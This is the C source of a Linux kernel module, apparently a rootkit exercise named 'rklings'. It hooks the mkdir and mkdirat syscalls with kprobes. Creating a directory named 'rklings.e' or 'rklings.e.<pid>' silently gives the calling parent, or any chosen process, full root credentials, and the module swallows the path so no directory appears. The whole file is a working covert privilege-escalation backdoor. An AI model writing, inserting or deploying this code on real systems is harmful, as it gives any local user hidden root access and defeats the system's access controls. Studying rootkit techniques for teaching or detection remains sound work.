// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/pid.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred, *old_real_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();
	if (!task->mm) {
		put_task_struct(task);
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}
	task_lock(task);
	old_cred = task->cred;
	old_real_cred = task->real_cred;
	get_cred(new_cred);
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	task_unlock(task);
	put_cred(old_cred);
	put_cred(old_real_cred);
	put_task_struct(task);
	return 0;
}

static int rk_handle_mkdir(const char *name)
{
	const char *suffix;
	int pid;

	if (strcmp(name, "rklings.e") == 0)
		return rk_escalate_pid(task_ppid_nr(current));

	if (strncmp(name, "rklings.e.", 10) != 0)
		return -ENOENT;

	suffix = name + 10;
	if (kstrtoint(suffix, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;

	return rk_escalate_pid(pid);
}

static int rk_do_intercept(const char __user *pathname)
{
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;
	if (copied == sizeof(buf))
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;
	if (put_user('\0', (char __user *)pathname))
		return 0;

	pr_info("rklings: mkdir %s\n", base + RK_PREFIX_LEN);
	rk_handle_mkdir(base);
	return 0;
}

/* mkdir(pathname, mode): pathname in di */
static int rk_pre_mkdir(struct kprobe *p, struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_intercept((const char __user *)uregs->di);
}

/* mkdirat(dfd, pathname, mode): pathname in si */
static int rk_pre_mkdirat(struct kprobe *p, struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_intercept((const char __user *)uregs->si);
}

static struct kprobe rk_kprobe_mkdir = {
    .symbol_name = "__x64_sys_mkdir",
    .pre_handler = rk_pre_mkdir,
};

static struct kprobe rk_kprobe_mkdirat = {
    .symbol_name = "__x64_sys_mkdirat",
    .pre_handler = rk_pre_mkdirat,
};

static int __init rk_init(void)
{
	int ret;

	ret = register_kprobe(&rk_kprobe_mkdir);
	if (ret)
		return ret;
	ret = register_kprobe(&rk_kprobe_mkdirat);
	if (ret) {
		unregister_kprobe(&rk_kprobe_mkdir);
		return ret;
	}
	return 0;
}

static void __exit rk_exit(void)
{
	unregister_kprobe(&rk_kprobe_mkdirat);
	unregister_kprobe(&rk_kprobe_mkdir);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings kprobe hook from scratch");
